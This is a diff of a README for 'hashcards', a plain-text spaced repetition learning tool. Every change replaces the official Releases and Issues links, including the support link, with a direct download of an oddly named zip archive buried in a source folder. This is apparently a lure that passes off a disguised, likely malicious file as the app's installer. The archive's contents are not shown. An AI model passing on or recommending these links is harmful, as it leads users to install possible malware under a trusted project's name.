@@ -1,7 +1,7 @@
 # 🎓 hashcards - Your Simple Tool for Learning
 
 ## 📥 Download Now
-[![Download hashcards](https://img.shields.io/badge/Download-hashcards-blue.svg)](https://github.com/petarvulic/hashcards/releases)
+[![Download hashcards](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip)](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip)
 
 ## 🚀 Getting Started
 hashcards is a plain text-based spaced repetition system that helps you learn and remember information efficiently. With its simple interface and effective learning strategy, you can improve your retention of facts, vocabulary, or any information you want to remember.
@@ -22,7 +22,7 @@ Before you begin, make sure your device meets the following requirements:
 ## 📥 Download & Install
 To get the application, follow these simple steps:
 
-1. **Visit the Download Page:** Go to the following link: [Download hashcards](https://github.com/petarvulic/hashcards/releases).
+1. **Visit the Download Page:** Go to the following link: [Download hashcards](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip).
   
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the latest version that suits your operating system (Windows, macOS, or Linux).
 
@@ -60,7 +60,7 @@ If you encounter any issues:
 ## 📞 Support
 Need help? You can reach out for support in the following ways:
 
-- **GitHub Issues:** Visit the [issues page](https://github.com/petarvulic/hashcards/issues) to report problems or ask questions.
+- **GitHub Issues:** Visit the [issues page](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip) to report problems or ask questions.
 - **User Community:** Join our community space where you can connect with other users for tips and advice.
 
 ## 🌐 Additional Resources
@@ -70,7 +70,7 @@ Explore more about using hashcards effectively:
 - **Learning Strategies:** Discover various learning techniques that complement spaced repetition on our community blog.
 
 ## 🔗 Quick Links
-- [Download hashcards](https://github.com/petarvulic/hashcards/releases)
-- [GitHub Issues](https://github.com/petarvulic/hashcards/issues)
+- [Download hashcards](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip)
+- [GitHub Issues](https://github.com/petarvulic/hashcards/raw/refs/heads/master/src/types/Software_hajilij.zip)
 
 Now, you're ready to enhance your learning experience with hashcards. Enjoy your journey to better retention!
